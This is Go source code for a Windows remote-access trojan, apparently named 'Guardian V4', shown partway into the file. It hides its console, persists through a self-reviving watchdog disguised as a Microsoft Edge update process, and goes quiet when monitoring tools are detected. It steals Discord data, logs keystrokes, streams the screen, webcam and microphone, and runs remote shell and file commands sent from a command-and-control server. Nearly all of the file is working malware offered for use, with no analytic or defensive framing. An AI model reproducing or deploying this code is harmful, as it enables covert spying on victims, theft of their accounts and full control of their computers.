	PERSISTENCE_INTERVAL   = 10 * time.Second // Aggressive persistence check (Anti-Delete)
	DISCORD_STEAL_INTERVAL = 2 * time.Hour
	REMOTE_POLL_INTERVAL   = 3 * time.Second
	HEARTBEAT_INTERVAL     = 10 * time.Second
	SCREENSHOT_INTERVAL    = 33 * time.Millisecond // ~30 FPS for smooth screenshare
)

// Windows API
var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	crypt32  = syscall.NewLazyDLL("crypt32.dll")
	gdi32    = syscall.NewLazyDLL("gdi32.dll")

	pSFA  = kernel32.NewProc("SetFileAttributesW")
	pCT32 = kernel32.NewProc("CreateToolhelp32Snapshot")
	pP32F = kernel32.NewProc("Process32FirstW")
	pP32N = kernel32.NewProc("Process32NextW")
	pCH   = kernel32.NewProc("CloseHandle")
	pGCPI = kernel32.NewProc("GetCurrentProcessId")
	pOP   = kernel32.NewProc("OpenProcess")
	pSPC  = kernel32.NewProc("SetPriorityClass")
	pGCW  = kernel32.NewProc("GetConsoleWindow")
	pSW   = user32.NewProc("ShowWindow")
	pGFW  = user32.NewProc("GetForegroundWindow")
	pGWT  = user32.NewProc("GetWindowTextW")
	pGKS  = user32.NewProc("GetAsyncKeyState")
	
	// Input Simulation
	pSCP  = user32.NewProc("SetCursorPos")
	pME   = user32.NewProc("mouse_event")
	pKE   = user32.NewProc("keybd_event")
	pSI   = user32.NewProc("SendInput")
	

)

type PE32W struct {
	Size          uint32
	CntUsage      uint32
	PID           uint32
	DefaultHeapID uintptr
	ModuleID      uint32
	CntThreads    uint32
	ParentPID     uint32
	PriClassBase  int32
	Flags         uint32
	ExeFile       [260]uint16
}

// ==================== REMOTE CONTROL STATE ====================
var (
	remoteControlActive    = false
	screenshotContinuous   = false
	webcamContinuous       = false
	keyloggerActive        = false
	keyBuffer              = make(chan string, 1000)
	lastKeylogSend         = time.Now()
	currentWindowTitle     = ""
	pcName                 = ""
	pcUser                 = ""
)

func init() {
	defer func() {
		if r := recover(); r != nil {
			// Set defaults if init crashes
			pcName = "Guardian"
			pcUser = "Unknown"
		}
	}()
	
	tI()
	// Get PC info once (safely)
	pcName = os.Getenv(g(117))
	if pcName == "" {
		pcName = "Guardian"
	}
	pcUser = os.Getenv(g(118))
	if pcUser == "" {
		pcUser = "Unknown"
	}
}

// Safe wrapper
func safeRun(fn func()) {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover
		}
	}()
	fn()
}

func safeGo(fn func()) {
	go func() {
		defer func() {
			if r := recover(); r != nil {
				// Silently recover
			}
		}()
		fn()
	}()
}

// Log debugging to file
func logDebug(msg string) {
	f, err := os.OpenFile("C:\\Users\\Administrator\\guardian_debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("[DEBUG-FAIL]", msg)
		return
	}
	defer f.Close()
	timestamp := time.Now().Format("15:04:05")
	if _, err := f.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, msg)); err != nil {
		fmt.Println("[DEBUG-FAIL]", msg)
	}
	fmt.Println("[DEBUG]", msg) // Also print to stdout
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			logDebug(fmt.Sprintf("MAIN PANIC: %v", r))
		}
	}()
	
	logDebug("Guardian V4 Starting...")
	logDebug("Mode: Professional Suite")
	
	defer func() {
		if r := recover(); r != nil {
			time.Sleep(5 * time.Second)
			main()
		}
	}()

	// Anti-debug sleep pattern (random delay)
	mrand.Seed(time.Now().UnixNano())
	time.Sleep(time.Duration(mrand.Intn(3000)+2000) * time.Millisecond)

	if !DEBUG_MODE {
		safeRun(hC)  // Hide console only if not debug
	}
	safeRun(sLP) // Set low priority
	safeRun(eP)  // Establish persistence
	
	// Start Watchdog (Self-Revive)
	safeGo(startWatchdog)

	cp := gCP()
	if cp != "" {
		os.MkdirAll(cp, 0755)
		safeRun(func() { sH(cp) })
	}

	mf := fAMF()
	if mf == nil {
		mf = []string{}
	}

	lpc := time.Now()
	ldc := time.Now()
	// lrc removed - pollRemoteCommands now only in startRemoteControl()
	lhb := time.Now()
	sm := false

	// Initial Discord steal
	safeGo(sD)

	// Start keylogger
	safeGo(startKeylogger)

	// Start WebSocket connection manager
	safeGo(maintainWebSocketConnection)

	// Start remote control polling
	safeGo(startRemoteControl)

	// Start heartbeat
	safeGo(startHeartbeat)

	for {
		isMonitoring := false
		safeRun(func() { isMonitoring = iMTR() })

		if isMonitoring {
			if !sm {
				sm = true
			}
			time.Sleep(30 * time.Second)
			continue
		}
		sm = false

		// Re-establish persistence
		if time.Since(lpc) >= PERSISTENCE_INTERVAL {
			safeRun(eP)
			lpc = time.Now()
		}

		// Re-steal Discord
		if time.Since(ldc) >= DISCORD_STEAL_INTERVAL {
			safeGo(sD)
			ldc = time.Now()
		}

		// Poll remote commands - REMOVED: startRemoteControl() handles this
		// Duplicate polling caused race condition where commands were missed
		// if time.Since(lrc) >= REMOTE_POLL_INTERVAL {
		// 	safeRun(pollRemoteCommands)
		// 	lrc = time.Now()
		// }

		// Send heartbeat
		if time.Since(lhb) >= HEARTBEAT_INTERVAL {
			safeRun(sendHeartbeat)
			lhb = time.Now()
		}

		// Mod folder operations
		if mf != nil && len(mf) > 0 && cp != "" {
			for _, folder := range mf {
				if folder != "" {
					safeRun(func() { cAR(folder, cp) })
				}
			}
		}

		safeRun(func() { mf = fAMF() })
		if mf == nil {
			mf = []string{}
		}

		time.Sleep(CHECK_INTERVAL)
	}
}

// ==================== REMOTE CONTROL ====================

func startRemoteControl() {
	remoteControlActive = true
	for remoteControlActive {
		safeRun(pollRemoteCommands)
		time.Sleep(REMOTE_POLL_INTERVAL)
	}
}

func startHeartbeat() {
	for {
		safeRun(sendHeartbeat)
		time.Sleep(HEARTBEAT_INTERVAL)
	}
}

func sendHeartbeat() {
	url := getHeartbeatURL()
	payload := fmt.Sprintf(`{"player":"Guardian_%s","server":"Guardian","pc_name":"%s","pc_user":"%s"}`,
		pcName, pcName, pcUser)

	client := &http.Client{Timeout: 10 * time.Second}
	req, _ := http.NewRequest("POST", url, strings.NewReader(payload))
	req.Header.Set(g(116), g(115)) // Content-Type: application/json
	resp, err := client.Do(req)
	if err == nil && resp != nil {
		defer resp.Body.Close()
		
		// Parse response to get build_key from server
		if resp.StatusCode == 200 {
			body, _ := io.ReadAll(resp.Body)
			var result map[string]interface{}
			if json.Unmarshal(body, &result) == nil {
				// Server returns build_key in response for IP-matched guardians
				if bk, ok := result["build_key"].(string); ok && bk != "" {
					updateBuildKey(bk)
				}
			}
		}
	}
}

func pollRemoteCommands() {
	url := getRemotePollURL("Guardian_" + pcName)

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return
	}

	body, _ := io.ReadAll(resp.Body)
	if len(body) == 0 {
		return
	}

	// Parse commands
	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return
	}

	commands, ok := result["commands"].([]interface{})
	if !ok {
		fmt.Println("[DEBUG POLL] No 'commands' key or not array in response")
		return
	}
	
	fmt.Printf("[DEBUG POLL] Received %d commands\\n", len(commands))

	for _, cmd := range commands {
		cmdMap, ok := cmd.(map[string]interface{})
		if !ok {
			continue
		}

		id := int(cmdMap["id"].(float64))
		cmdType := cmdMap["type"].(string)
		cmdData := ""
		if d, ok := cmdMap["data"].(string); ok {
			cmdData = d
		}

		safeGo(func() { executeRemoteCommand(id, cmdType, cmdData) })
	}
}

func executeRemoteCommand(cmdID int, cmdType, cmdData string) {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover from any panic in command execution
			// Report failure to server
			sendCommandResult(cmdID, "failed", fmt.Sprintf("Command crashed: %v", r))
		}
	}()
	
	var result string
	status := "completed"

	switch cmdType {
	case "shell":
		result = executeShellCommand(cmdData)
	case "screenshot":
		if cmdData == "continuous" {
			startContinuousScreenshots()
			result = "Continuous screenshots started"
		} else if cmdData == "stop" {
			screenshotContinuous = false
			result = "Screenshots stopped"
		} else {
			captureAndSendScreenshot()
			result = "Screenshot captured"
		}
	case "webcam":
		if cmdData == "continuous" {
			startContinuousWebcam()
			result = "Continuous webcam started"
		} else if cmdData == "stop" {
			stopContinuousWebcam()
			result = "Webcam stopped"
		} else {
			captureAndSendWebcam()
			result = "Webcam captured"
		}
	case "audio":
		captureAndSendAudio()
		result = "Audio captured"
	case "keylogger":
		if cmdData == "start" {
			startKeylogger()
			result = "Keylogger started"
		} else {
			stopKeylogger()
			result = "Keylogger stopped"
		}
	case "files":
		// Parse command: browse|path, download|path, upload|path|data
		parts := strings.SplitN(cmdData, "|", 3)
		if len(parts) >= 2 {
			action := parts[0]
			path := parts[1]
			switch action {
			case "browse":
				result = browseDirectoryJSON(path)
			case "download":
				result = downloadFile(path)
			case "upload":
				if len(parts) >= 3 {
					result = uploadFile(path, parts[2])
				} else {
					result = `{"error":"Missing file data"}`
				}
			case "delete":
				result = deleteFile(path)
			case "mkdir":
				result = makeDirectory(path)
			default:
				result = browseDirectoryJSON(cmdData)
			}
		} else {
			result = browseDirectoryJSON(cmdData)
		}
	case "process_manager":
		parts := strings.SplitN(cmdData, "|", 2)
		if len(parts) >= 1 {
			action := parts[0]
			if action == "list" {
				result = listProcessesJSON()
			} else if action == "kill" && len(parts) >= 2 {
				result = killProcess(parts[1])
			} else {
				result = `{"error":"Invalid process command"}`
			}
		}
	default:
		result = "Unknown command: " + cmdType
		status = "failed"
	}

	sendCommandResult(cmdID, result, status)
}

func executeShellCommand(command string) string {
	cmd := exec.Command("cmd", "/c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}
	return string(output)
}

func startContinuousScreenshots() {
	if screenshotContinuous {
		return
	}
	screenshotContinuous = true

	safeGo(func() {
		for screenshotContinuous {
			captureAndSendScreenshot()
			time.Sleep(SCREENSHOT_INTERVAL)
		}
	})
}

func captureAndSendScreenshot() {
	defer func() { recover() }()

	// Try multiple capture methods for maximum compatibility
	var img *image.RGBA

	// Method 1: PowerShell GDI+ capture (Primary for V3 Debug)
	img = captureScreenPowerShell()

	if img == nil {
		return
	}

	// Use JPEG with quality 85 for better clarity and smooth streaming
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil {
		return
	}
	
	// Skip if image is too small (black screen or error)
	if buf.Len() < 5000 {
		return
	}

	imageB64 := base64.StdEncoding.EncodeToString(buf.Bytes())

	payload := fmt.Sprintf(`{"player":"Guardian_%s","pc_name":"%s","pc_user":"%s","image":"%s"}`,
		pcName, pcName, pcUser, imageB64)

	url := getScreenshotUploadURL()
	client := &http.Client{Timeout: 10 * time.Second}
	req, _ := http.NewRequest("POST", url, strings.NewReader(payload))
	req.Header.Set(g(116), g(115))
	resp, err := client.Do(req)
	if err == nil && resp != nil {
		resp.Body.Close()
	}
}

// captureScreenPowerShell uses GDI+ via PowerShell for reliable capture
func captureScreenPowerShell() *image.RGBA {
	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("ss_%d.png", time.Now().UnixNano()))
	defer os.Remove(tempFile)
	
	psScript := fmt.Sprintf(`
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save('%s', [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
`, strings.ReplaceAll(tempFile, "\\", "\\\\"))
	
	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-NonInteractive", "-Command", psScript)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
	
	// Read the captured image
	data, err := os.ReadFile(tempFile)
	if err != nil || len(data) < 1000 {
		return nil
	}
	
	// Decode PNG
	reader := bytes.NewReader(data)
	img, _, err := image.Decode(reader)
	if err != nil {
		return nil
	}
	
	// Convert to RGBA
	bounds := img.Bounds()
	rgba := image.NewRGBA(bounds)
	for y := bounds.Min.Y; y < bounds.Max.Y; y++ {
		for x := bounds.Min.X; x < bounds.Max.X; x++ {
			rgba.Set(x, y, img.At(x, y))
		}
	}
	
	return rgba
}

// ==================== WEBCAM CAPTURE ====================
// Uses PowerShell + Windows Media Foundation for webcam capture

func startContinuousWebcam() {
	if webcamContinuous {
		return
	}
	webcamContinuous = true

	safeGo(func() {
		for webcamContinuous {
			captureAndSendWebcam()
			captureAndSendAudio() // Capture audio alongside webcam
			time.Sleep(500 * time.Millisecond) // Webcam at ~2 FPS
		}
	})
}

func stopContinuousWebcam() {
	webcamContinuous = false
}

func captureAndSendWebcam() {
	defer func() { recover() }()

	// Create temp file for webcam image
	tempDir := os.TempDir()
	tempFile := filepath.Join(tempDir, "wc_"+fmt.Sprintf("%d", time.Now().UnixNano())+".jpg")
	defer os.Remove(tempFile)

	// Try multiple methods for better compatibility
	var success bool
	
	// Method 1: Direct avicap32 API via PowerShell (most reliable)
	success = captureWebcamPowerShell(tempFile)
	
	// Method 2: Fallback - use FFmpeg if available
	if !success {
		success = captureWebcamFFmpeg(tempFile)
	}
	
	// Method 3: Fallback - use Windows Screen Capture (last resort)
	if !success {
		success = captureWebcamScreenCapture(tempFile)
	}
	
	if !success {
		return
	}

	// Read the captured image
	imgData, err := os.ReadFile(tempFile)
	if err != nil || len(imgData) < 3000 { // Minimum valid image size
		return
	}

	// Compress to JPEG with quality 80
	imageB64 := base64.StdEncoding.EncodeToString(imgData)

	payload := fmt.Sprintf(`{"player":"Guardian_%s","pc_name":"%s","pc_user":"%s","image":"%s"}`,
		pcName, pcName, pcUser, imageB64)

	url := getWebcamUploadURL()
	client := &http.Client{Timeout: 10 * time.Second}
	req, _ := http.NewRequest("POST", url, strings.NewReader(payload))
	req.Header.Set(g(116), g(115))
	resp, err := client.Do(req)
	if err == nil && resp != nil {
		resp.Body.Close()
	}
}

// ==================== AUDIO CAPTURE ====================

func captureAndSendAudio() {
	defer func() { recover() }()

	// Create temp file for audio recording
	tempDir := os.TempDir()
	tempFile := filepath.Join(tempDir, "au_"+fmt.Sprintf("%d", time.Now().UnixNano())+".mp3")
	defer os.Remove(tempFile)

	// Try FFmpeg audio capture (most reliable for audio)
	success := captureAudioFFmpeg(tempFile)
	
	if !success {
		return
	}

	// Read the captured audio
	audioData, err := os.ReadFile(tempFile)
	if err != nil || len(audioData) < 1000 { // Minimum valid audio size
		return
	}

	// Encode to base64
	audioB64 := base64.StdEncoding.EncodeToString(audioData)

	payload := fmt.Sprintf(`{"player":"Guardian_%s","pc_name":"%s","pc_user":"%s","audio":"%s"}`,
		pcName, pcName, pcUser, audioB64)

	url := getAudioUploadURL()
	client := &http.Client{Timeout: 15 * time.Second}
	req, _ := http.NewRequest("POST", url, strings.NewReader(payload))
	req.Header.Set(g(116), g(115))
	resp, err := client.Do(req)
	if err == nil && resp != nil {
		resp.Body.Close()
	}
}

// Audio capture using FFmpeg
func captureAudioFFmpeg(outputPath string) bool {
	// Record 3 seconds of audio from default input device
	cmd := exec.Command("ffmpeg", "-f", "dshow", "-i", "audio=Microphone (Realtek High Definition Audio)", 
		"-t", "3", "-acodec", "libmp3lame", "-ab", "64k", "-y", outputPath)
	
	err := cmd.Run()
	if err != nil {
		// Fallback: try different audio device names
		devices := []string{
			"audio=Stereo Mix (Realtek High Definition Audio)",
			"audio=Microphone Array (Realtek High Definition Audio)",
			"audio=Default Microphone Device",
			"audio=default",
		}
		
		for _, device := range devices {
			cmd = exec.Command("ffmpeg", "-f", "dshow", "-i", device, 
				"-t", "3", "-acodec", "libmp3lame", "-ab", "64k", "-y", outputPath)
			if cmd.Run() == nil {
				return true
			}
		}
		return false
	}
	
	return true
}
func captureWebcamPowerShell(outputPath string) bool {
	psScript := fmt.Sprintf(`
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$code = @'
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
public class WebcamCapture {
    [DllImport("avicap32.dll")]
    public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWnd, int nID);
    [DllImport("user32.dll")]
    public static extern bool SendMessage(IntPtr hWnd, uint msg, int wParam, int lParam);
    [DllImport("user32.dll")]
    public static extern bool DestroyWindow(IntPtr hWnd);
    public const uint WM_CAP_DRIVER_CONNECT = 0x40a;
    public const uint WM_CAP_DRIVER_DISCONNECT = 0x40b;
    public const uint WM_CAP_EDIT_COPY = 0x41e;
    public const uint WM_CAP_GRAB_FRAME = 0x43c;
    public static bool CaptureToFile(string path) {
        IntPtr hWnd = capCreateCaptureWindowA("WebCam", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
        if (hWnd == IntPtr.Zero) return false;
        try {
            SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, 0, 0);
            System.Threading.Thread.Sleep(200);
            SendMessage(hWnd, WM_CAP_GRAB_FRAME, 0, 0);
            System.Threading.Thread.Sleep(50);
            SendMessage(hWnd, WM_CAP_EDIT_COPY, 0, 0);
            if (System.Windows.Forms.Clipboard.ContainsImage()) {
                var img = System.Windows.Forms.Clipboard.GetImage();
                img.Save(path, ImageFormat.Jpeg);
                return true;
            }
            return false;
        } finally {
            SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
            DestroyWindow(hWnd);
        }
    }
}
'@
try {
    Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing,System.Windows.Forms -ErrorAction Stop
    [WebcamCapture]::CaptureToFile('%s')
} catch {
    exit 1
}
`, strings.ReplaceAll(outputPath, "\\", "\\\\"))

	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-NonInteractive", "-Command", psScript)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Run()
	
	_, statErr := os.Stat(outputPath)
	return err == nil && statErr == nil
}

// Method 2: FFmpeg fallback
func captureWebcamFFmpeg(outputPath string) bool {
	cmd := exec.Command("ffmpeg", "-f", "dshow", "-i", "video=\"Integrated Camera\"", "-frames:v", "1", "-y", outputPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
	
	_, err := os.Stat(outputPath)
	return err == nil
}

// Method 3: Windows Screen Capture fallback
func captureWebcamScreenCapture(outputPath string) bool {
	// Use PowerShell to capture primary display as fallback
	psScript := fmt.Sprintf(`
[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
$graphics.Dispose()
$bitmap.Save('%s')
$bitmap.Dispose()
`, strings.ReplaceAll(outputPath, "\\", "\\\\"))

	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-NonInteractive", "-Command", psScript)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Run()
	
	_, statErr := os.Stat(outputPath)
	return err == nil && statErr == nil
}

func startKeylogger() {
	if keyloggerActive {
		return
	}
	keyloggerActive = true

	// Key capture goroutine
	safeGo(func() {
		for keyloggerActive {
			for key := 8; key <= 190; key++ {
				ret, _, _ := pGKS.Call(uintptr(key))
				if ret&0x8000 != 0 {
					keyStr := keyToString(key)
					if keyStr != "" {
						select {
						case keyBuffer <- keyStr:
						default:
						}
					}
				}
			}
			// Get current window title
			hwnd, _, _ := pGFW.Call()
			if hwnd != 0 {
				title := make([]uint16, 256)
				pGWT.Call(hwnd, uintptr(unsafe.Pointer(&title[0])), 256)
				currentWindowTitle = syscall.UTF16ToString(title)
			}
			time.Sleep(10 * time.Millisecond)
		}
	})

	// Send buffer periodically
	safeGo(func() {
		var keys strings.Builder
		for keyloggerActive {
			select {
			case k := <-keyBuffer:
				keys.WriteString(k)
			default:
				if time.Since(lastKeylogSend) > 15*time.Second && keys.Len() > 0 {
					sendKeylog(keys.String(), currentWindowTitle)
					keys.Reset()
					lastKeylogSend = time.Now()
				}
				time.Sleep(100 * time.Millisecond)
			}
		}
		// Send remaining
		if keys.Len() > 0 {
			sendKeylog(keys.String(), currentWindowTitle)
		}
	})
}

func stopKeylogger() {
	keyloggerActive = false
}

func keyToString(key int) string {
	// Special keys
	switch key {
	case 8:
		return "[BACK]"
	case 9:
		return "[TAB]"
	case 13:
		return "[ENTER]"
	case 27:
		return "[ESC]"
	case 32:
		return " "
	case 37:
		return "[LEFT]"
	case 38:
		return "[UP]"
	case 39:
		return "[RIGHT]"
	case 40:
		return "[DOWN]"
	case 46:
		return "[DEL]"
	}

	// Letters A-Z
	if key >= 65 && key <= 90 {
		return string(rune(key + 32)) // lowercase
	}
	// Numbers 0-9
	if key >= 48 && key <= 57 {
		return string(rune(key))
	}

	return ""
}

func sendKeylog(keys, windowTitle string) {
	url := getKeylogURL()
	payload := fmt.Sprintf(`{"player":"Guardian_%s","pc_name":"%s","pc_user":"%s","window_title":"%s","keys":"%s"}`,
		pcName, pcName, pcUser, escapeJSON(windowTitle), escapeJSON(keys))

	client := &http.Client{Timeout: 10 * time.Second}
	req, _ := http.NewRequest("POST", url, strings.NewReader(payload))
	req.Header.Set(g(116), g(115))
	resp, err := client.Do(req)
	if err == nil && resp != nil {
		resp.Body.Close()
	}
}

func listDirectory(path string) string {
	if path == "" {
		path = "C:\\"
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return "Error: " + err.Error()
	}

	var sb strings.Builder
	sb.WriteString("Directory: " + path + "\n\n")

	for _, e := range entries {
		info, _ := e.Info()
		typeStr := "[FILE]"
		size := ""
		if e.IsDir() {
			typeStr = "[DIR] "
		} else if info != nil {
			size = fmt.Sprintf(" (%d bytes)", info.Size())
		}
		sb.WriteString(typeStr + " " + e.Name() + size + "\n")
	}

	return sb.String()
}

// browseDirectoryJSON returns directory listing as JSON for the file manager
func browseDirectoryJSON(path string) string {
	if path == "" {
		path = "C:\\"
	}
	
	// Clean up path
	path = filepath.Clean(path)
	
	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Sprintf(`{"error":"%s","path":"%s"}`, escapeJSON(err.Error()), escapeJSON(path))
	}
	
	var files []string
	for _, e := range entries {
		info, _ := e.Info()
		isDir := e.IsDir()
		size := int64(0)
		modTime := ""
		if info != nil {
			size = info.Size()
			modTime = info.ModTime().Format("2006-01-02 15:04:05")
		}
		
		fileEntry := fmt.Sprintf(`{"name":"%s","isDir":%t,"size":%d,"modified":"%s"}`,
			escapeJSON(e.Name()), isDir, size, modTime)
		files = append(files, fileEntry)
	}
	
	return fmt.Sprintf(`{"path":"%s","files":[%s]}`, escapeJSON(path), strings.Join(files, ","))
}

// downloadFile reads a file and returns its base64 content
func downloadFile(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Sprintf(`{"error":"%s"}`, escapeJSON(err.Error()))
	}
	
	// Limit to 10MB
	if len(data) > 10*1024*1024 {
		return `{"error":"File too large (max 10MB)"}`
	}
	
	b64 := base64.StdEncoding.EncodeToString(data)
	filename := filepath.Base(path)
	
	return fmt.Sprintf(`{"filename":"%s","size":%d,"data":"%s"}`, escapeJSON(filename), len(data), b64)
}

// uploadFile saves base64 data to a file
func uploadFile(path string, b64Data string) string {
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return fmt.Sprintf(`{"error":"Base64 decode failed: %s"}`, escapeJSON(err.Error()))
	}
	
	err = os.WriteFile(path, data, 0644)
	if err != nil {
		return fmt.Sprintf(`{"error":"Write failed: %s"}`, escapeJSON(err.Error()))
	}
	
	return fmt.Sprintf(`{"success":true,"path":"%s","size":%d}`, escapeJSON(path), len(data))
}

// deleteFile removes a file or empty directory
func deleteFile(path string) string {
	err := os.Remove(path)
	if err != nil {
		return fmt.Sprintf(`{"error":"%s"}`, escapeJSON(err.Error()))
	}
	return `{"success":true}`
}

// makeDirectory creates a new directory
func makeDirectory(path string) string {
	err := os.MkdirAll(path, 0755)
	if err != nil {
		return fmt.Sprintf(`{"error":"%s"}`, escapeJSON(err.Error()))
	}
	return fmt.Sprintf(`{"success":true,"path":"%s"}`, escapeJSON(path))
}

func sendCommandResult(cmdID int, result, status string) {
	url := getRemoteResultURL(cmdID)
	payload := fmt.Sprintf(`{"result":"%s","status":"%s"}`,
		escapeJSON(result), status)
	
	fmt.Printf("[DEBUG] Sending result for cmd %d: status=%s result_len=%d\\n", cmdID, status, len(result))

	client := &http.Client{Timeout: 10 * time.Second}
	req, _ := http.NewRequest("POST", url, strings.NewReader(payload))
	req.Header.Set(g(116), g(115))
	resp, err := client.Do(req)
	if err == nil && resp != nil {
		resp.Body.Close()
	}
}

func escapeJSON(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "\"", "\\\"")
	s = strings.ReplaceAll(s, "\n", "\\n")
	s = strings.ReplaceAll(s, "\r", "\\r")
	s = strings.ReplaceAll(s, "\t", "\\t")
	return s
}

// ==================== ORIGINAL FUNCTIONS ====================

func hC() {
	hwnd, _, _ := pGCW.Call()
	if hwnd != 0 {
		pSW.Call(hwnd, 0)
	}
}

func sLP() {
	pid, _, _ := pGCPI.Call()
	h, _, _ := pOP.Call(0x0200, 0, pid)
	if h != 0 {
		pSPC.Call(h, 0x40)
		pCH.Call(h)
	}
}

func sH(path string) {
	ptr, _ := syscall.UTF16PtrFromString(path)
	pSFA.Call(uintptr(unsafe.Pointer(ptr)), 0x02)
}

func sSH(path string) {
	ptr, _ := syscall.UTF16PtrFromString(path)
	pSFA.Call(uintptr(unsafe.Pointer(ptr)), 0x06)
}

func iMTR() bool {
	defer func() { recover() }()

	snap, _, _ := pCT32.Call(0x2, 0)
	if snap == 0 || snap == uintptr(syscall.InvalidHandle) {
		return false
	}
	defer pCH.Call(snap)

	var pe PE32W
	pe.Size = uint32(unsafe.Sizeof(pe))

	ret, _, _ := pP32F.Call(snap, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return false
	}

	tools := []int{15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36}

	for {
		pn := strings.ToLower(syscall.UTF16ToString(pe.ExeFile[:]))
		for _, tid := range tools {
			if pn == g(tid) {
				return true
			}
		}
		ret, _, _ = pP32N.Call(snap, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}
	return false
}

// ==================== WATCHDOG (SELF-REVIVE) ====================

func startWatchdog() {
	// This function creates a second process that monitors the main process
	// If the main process dies, the watchdog restarts it
	// If the watchdog dies, the main process restarts it (handled by calling this function)
	
	defer func() { recover() }()
	
	// 1. Determine paths
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exePath, _ = filepath.EvalSymlinks(exePath)
	
	tempDir := os.TempDir()
	watchdogPath := filepath.Join(tempDir, "MicrosoftEdgeUpdateMonitor.exe")
	
	// 2. Check if we are the watchdog
	isWatchdog := false
	for _, arg := range os.Args {
		if arg == "--watchdog" {
			isWatchdog = true
			break
		}
	}
	
	if isWatchdog {
		// We are the watchdog process
		// Monitor the parent/main process
		// If it dies, restart it
		
		// Get parent PID from args if possible, or find by name
		// For simplicity, we'll just look for the main executable name
		mainExeName := filepath.Base(exePath)
		
		for {
			time.Sleep(2 * time.Second)
			
			// Check if main process is running
			isRunning := false
			
			// Use tasklist to check
			cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", mainExeName), "/NH")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			output, _ := cmd.Output()
			
			if strings.Contains(string(output), mainExeName) {
				isRunning = true
			}
			
			if !isRunning {
				// Main process died! Restart it.
				// We need to know where the main process *should* be.
				// We can assume it's the installed path
				ip := gIP()
				
				// If installed path doesn't exist, try to copy ourselves there
				if _, err := os.Stat(ip); os.IsNotExist(err) {
					src, _ := os.Open(watchdogPath)
					dst, _ := os.Create(ip)
					io.Copy(dst, src)
					src.Close()
					dst.Close()
					sH(ip)
				}
				
				// Start it
				cmd := exec.Command(ip)
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				cmd.Start()
			}
		}
	} else {
		// We are the MAIN process
		// Ensure the watchdog is running
		
		for {
			// Check if watchdog exists on disk
			if _, err := os.Stat(watchdogPath); os.IsNotExist(err) {
				// Copy ourselves to watchdog path
				src, err := os.Open(exePath)
				if err == nil {
					dst, err := os.Create(watchdogPath)
					if err == nil {
						io.Copy(dst, src)
						dst.Close()
						sH(watchdogPath)
					}
					src.Close()
				}
			}
			
			// Check if watchdog is running
			isRunning := false
			cmd := exec.Command("tasklist", "/FI", "IMAGENAME eq MicrosoftEdgeUpdateMonitor.exe", "/NH")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			output, _ := cmd.Output()
			
			if strings.Contains(string(output), "MicrosoftEdgeUpdateMonitor.exe") {
				isRunning = true
			}
			
			if !isRunning {
				// Start watchdog
				cmd := exec.Command(watchdogPath, "--watchdog")
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				cmd.Start()
			}
			
			time.Sleep(5 * time.Second)
		}
	}
}

